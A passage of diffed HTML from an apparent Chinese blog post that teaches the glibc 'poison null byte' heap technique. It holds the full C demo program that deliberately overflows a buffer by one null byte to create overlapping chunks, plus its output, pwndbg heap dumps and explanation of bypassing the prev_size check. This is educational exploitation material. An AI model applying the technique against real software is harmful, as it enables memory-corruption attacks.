class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Welcome to poison null byte 2.0!\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Tested in Ubuntu 16.04 64bit.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">uint8_t</span>* a;</span><br><span class="line">	<span class="type">uint8_t</span>* b;</span><br><span class="line">	<span class="type">uint8_t</span>* c;</span><br><span class="line">	<span class="type">uint8_t</span>* b1;</span><br><span class="line">	<span class="type">uint8_t</span>* b2;</span><br><span class="line">	<span class="type">uint8_t</span>* d;</span><br><span class="line">	<span class="type">void</span> *barrier;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We allocate 0x100 bytes for &#x27;a&#x27;.\n&quot;</span>);</span><br><span class="line">	a = (<span class="type">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;a: %p\n&quot;</span>, a);</span><br><span class="line">	<span class="type">int</span> real_a_size = malloc_usable_size(a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Since we want to overflow &#x27;a&#x27;, we need to know the &#x27;real&#x27; size of &#x27;a&#x27; &quot;</span></span><br><span class="line">		<span class="string">&quot;(it may be more than 0x100 because of rounding): %#x\n&quot;</span>, real_a_size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* chunk size attribute cannot have a least significant byte with a value of 0x00.</span></span><br><span class="line"><span class="comment">	 * the least significant byte of this will be 0x10, because the size of the chunk includes</span></span><br><span class="line"><span class="comment">	 * the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">	b = (<span class="type">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">	c = (<span class="type">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;c: %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	barrier =  <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n&quot;</span></span><br><span class="line">		<span class="string">&quot;The barrier is not strictly necessary, but makes things less confusing\n&quot;</span>, barrier);</span><br><span class="line"></span><br><span class="line">	<span class="type">uint64_t</span>* b_size_ptr = (<span class="type">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// added fix for size==prev_size(next_chunk) check in newer versions of glibc</span></span><br><span class="line">	<span class="comment">// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30</span></span><br><span class="line">	<span class="comment">// this added check requires we are allowed to have null pointers in b (not just a c string)</span></span><br><span class="line">	<span class="comment">//*(size_t*)(b+0x1f0) = 0x200;</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;In newer versions of glibc we will need to have our updated size inside b itself to pass &quot;</span></span><br><span class="line">		<span class="string">&quot;the check &#x27;chunksize(P) != prev_size (next_chunk(P))&#x27;\n&quot;</span>);</span><br><span class="line">	<span class="comment">// we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00)</span></span><br><span class="line">	<span class="comment">// which is the value of b.size after its first byte has been overwritten with a NULL byte</span></span><br><span class="line">	*(<span class="type">size_t</span>*)(b+<span class="number">0x1f0</span>) = <span class="number">0x200</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// this technique works by overwriting the size metadata of a free chunk</span></span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b.size is: (0x200 + 0x10) | prev_in_use\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);</span><br><span class="line">	a[real_a_size] = <span class="number">0</span>; <span class="comment">// &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot;</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="type">uint64_t</span>* c_prev_size_ptr = ((<span class="type">uint64_t</span>*)c)<span class="number">-2</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;c.prev_size is %#lx\n&quot;</span>,*c_prev_size_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// This malloc will result in a call to unlink on the chunk where b was.</span></span><br><span class="line">	<span class="comment">// The added check (commit id: 17f487b), if not properly handled as we did before,</span></span><br><span class="line">	<span class="comment">// will detect the heap corruption now.</span></span><br><span class="line">	<span class="comment">// The check is this: chunksize(P) != prev_size (next_chunk(P)) where</span></span><br><span class="line">	<span class="comment">// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)</span></span><br><span class="line">	<span class="comment">// next_chunk(P) == b-0x10+0x200 == b+0x1f0</span></span><br><span class="line">	<span class="comment">// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n&quot;</span>,</span><br><span class="line">		*((<span class="type">size_t</span>*)(b<span class="number">-0x8</span>)), *(<span class="type">size_t</span>*)(b<span class="number">-0x10</span> + *((<span class="type">size_t</span>*)(b<span class="number">-0x8</span>))));</span><br><span class="line">	b1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b1: %p\n&quot;</span>,b1);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we malloc &#x27;b1&#x27;. It will be placed where &#x27;b&#x27; was. &quot;</span></span><br><span class="line">		<span class="string">&quot;At this point c.prev_size should have been updated, but it was not: %#lx\n&quot;</span>,*c_prev_size_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Interestingly, the updated value of c.prev_size has been written 0x10 bytes &quot;</span></span><br><span class="line">		<span class="string">&quot;before c.prev_size: %lx\n&quot;</span>,*(((<span class="type">uint64_t</span>*)c)<span class="number">-4</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We malloc &#x27;b2&#x27;, our &#x27;victim&#x27; chunk.\n&quot;</span>);</span><br><span class="line">	<span class="comment">// Typically b2 (the victim) will be a structure with valuable pointers that we want to control</span></span><br><span class="line"></span><br><span class="line">	b2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b2: %p\n&quot;</span>,b2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(b2,<span class="string">&#x27;B&#x27;</span>,<span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Current b2 content:\n%s\n&quot;</span>,b2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we free &#x27;b1&#x27; and &#x27;c&#x27;: this will consolidate the chunks &#x27;b1&#x27; and &#x27;c&#x27; (forgetting about &#x27;b2&#x27;).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(b1);</span><br><span class="line">	<span class="built_in">free</span>(c);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Finally, we allocate &#x27;d&#x27;, overlapping &#x27;b2&#x27;.\n&quot;</span>);</span><br><span class="line">	d = <span class="built_in">malloc</span>(<span class="number">0x300</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;d: %p\n&quot;</span>,d);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now &#x27;d&#x27; and &#x27;b2&#x27; overlap.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">memset</span>(d,<span class="string">&#x27;D&#x27;</span>,<span class="number">0x300</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;New b2 content:\n%s\n&quot;</span>,b2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks&quot;</span></span><br><span class="line">		<span class="string">&quot;for the clear explanation of this technique.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	assert(<span class="built_in">strstr</span>(b2, <span class="string">&quot;DDDDDDDDDDDD&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">欢迎poison null byte <span class="number">2.0</span>!</span><br><span class="line">在Ubuntu <span class="number">16.04</span> <span class="number">64</span>位下测试。</span><br><span class="line">此技术仅适用于禁用tcache的glibc，请参阅build_glibc.sh获取构建指令。</span><br><span class="line">当存在 off by null 的时候可以使用该技术</span><br><span class="line">我们为<span class="string">&#x27;a&#x27;</span>分配<span class="number">0x100</span>个字节。</span><br><span class="line">a: <span class="number">0x681010</span></span><br><span class="line">因为我们想要溢出<span class="string">&#x27;a&#x27;</span>，我们需要知道<span class="string">&#x27;a&#x27;</span>的<span class="string">&#x27;实际&#x27;</span>大小(由于四舍五入的关系，它可能大于<span class="number">0x100</span>): <span class="number">0x108</span></span><br><span class="line">b: <span class="number">0x681120</span></span><br><span class="line">c: <span class="number">0x681330</span></span><br><span class="line">我们在<span class="number">0x681440</span>处分配了一个障碍chunk，这样当c被释放时就不会与顶部块合并。</span><br><span class="line">这个障碍并不是必须的，但是它让事情变得不那么混乱</span><br><span class="line">在glibc的新版本中，我们需要在b中包含更新后的大小，以便通过检查<span class="string">&#x27;chunksize(P) != prev_size (next_chunk(P))&#x27;</span></span><br><span class="line">b.size: <span class="number">0x211</span></span><br><span class="line">b.size为(<span class="number">0x200</span> + <span class="number">0x10</span>) | prev_in_use</span><br><span class="line">我们用一个空字节将<span class="string">&#x27;a&#x27;</span>溢出到<span class="string">&#x27;b&#x27;</span>的元数据中</span><br><span class="line">b.size: <span class="number">0x200</span> </span><br><span class="line">c.prev_size是 <span class="number">0x210</span></span><br><span class="line">但他根据 chunk b 的 size 找的时候会找到 b+<span class="number">0x1f0</span>那里,我们将通过检查，因为chunksize(P) == <span class="number">0x200</span> == <span class="number">0x200</span> == prev_size (next_chunk(P))</span><br><span class="line">b1: <span class="number">0x681120</span></span><br><span class="line">现在我们<span class="built_in">malloc</span> b1。它会被放在b所在的地方。此时c.prev_size应该已经更新，但它依然为:<span class="number">0x210</span></span><br><span class="line">有趣的是，c.prev_size的更新值在c.prev_size之前已经写入了<span class="number">0x10</span>字节：f0</span><br><span class="line">我们<span class="built_in">malloc</span> <span class="string">&#x27;b2&#x27;</span>，我们的<span class="string">&#x27;受害者&#x27;</span>块。</span><br><span class="line">b2: <span class="number">0x681230</span></span><br><span class="line">当前b2内容:</span><br><span class="line">BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB</span><br><span class="line">现在我们释放<span class="string">&#x27;b1&#x27;</span>和<span class="string">&#x27;c&#x27;</span>:这将巩固<span class="string">&#x27;b1&#x27;</span>和<span class="string">&#x27;c&#x27;</span>块(忘记<span class="string">&#x27;b2&#x27;</span>)。</span><br><span class="line">最后，我们分配<span class="string">&#x27;d&#x27;</span>，重叠<span class="string">&#x27;b2&#x27;</span>。</span><br><span class="line">d: <span class="number">0x681120</span></span><br><span class="line">现在d和b2重叠了。</span><br><span class="line">新b2内容:</span><br><span class="line">DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD</span><br><span class="line">感谢 https:<span class="comment">//www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunksfor 对该技术的清晰解释。</span></span><br></pre></td></tr></table></figure>
+<h3 id="首先分配a-b-c-d四个chunk"><a href="#首先分配a-b-c-d四个chunk" class="headerlink" title="首先分配a,b,c,d四个chunk"></a>首先分配a,b,c,d四个chunk</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line"><span class="number">0x603000</span> PREV_INUSE &#123;         <span class="comment">//a 0x111</span></span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">273</span>, </span><br><span class="line">  fd = <span class="number">0x0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x603110</span> PREV_INUSE &#123;           <span class="comment">//b 0x211</span></span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">529</span>, </span><br><span class="line">  fd = <span class="number">0x0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x603320</span> PREV_INUSE &#123;          <span class="comment">//c 0x111</span></span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">273</span>, </span><br><span class="line">  fd = <span class="number">0x0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x603430</span> PREV_INUSE &#123;        <span class="comment">//barrier  0x111 防止与 top chunk 合并的 chunk</span></span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">273</span>, </span><br><span class="line">  fd = <span class="number">0x0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x603540</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">133825</span>, </span><br><span class="line">  fd = <span class="number">0x0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <h3 id="绕过检查"><a href="#绕过检查" class="headerlink" title="绕过检查"></a>绕过检查</h3><p>接下来为了绕过 size 跟 next chunk 的 prev_size 的检查，我们在 chunk b 的末尾伪造一个 0x200 大小的 prev_size</p>
 <p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202201072332972.png" alt="image-20220107224357616"></p>
 <p>通过编辑 chunk a 来更改 b 的 size 最后一位为 0x00</p>
-<pre class=" language-lang-c"><code class="language-lang-c">pwndbg> x/10gx 0x603110 
-0x603110:    0x0000000000000000    0x0000000000000200  #溢出后b的size
-0x603120:    0x00007ffff7dd1b78    0x00007ffff7dd1b78
-0x603130:    0x0000000000000000    0x0000000000000000
-0x603140:    0x0000000000000000    0x0000000000000000
-0x603150:    0x0000000000000000    0x0000000000000000
-</code></pre>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">10</span>gx <span class="number">0x603110</span> </span><br><span class="line"><span class="number">0x603110</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000200</span>  #溢出后b的size</span><br><span class="line"><span class="number">0x603120</span>:	<span class="number">0x00007ffff7dd1b78</span>	<span class="number">0x00007ffff7dd1b78</span></span><br><span class="line"><span class="number">0x603130</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603140</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603150</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>这时候 c 那里的 prev_size 还是之前的，因为更改了 b 的 size，所以找的时候会找 b+0x200 的，即c-0x10，也正是这样让我们绕过了 chunksize(P) = prev_size (next_chunk(P)) 的检测</p>
 <h3 id="堆块重叠"><a href="#堆块重叠" class="headerlink" title="堆块重叠"></a>堆块重叠</h3><p>接下来申请一个 0x100 大小的 chunk，因为 b 已经 free 了，所以会把新申请的这个安排到 b 那里（我们把新申请的叫 b1）之前 b 那一块被分割出来了，剩下了 0xf0</p>
 <p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202201072332973.png" alt="image-20220107230458324"></p>
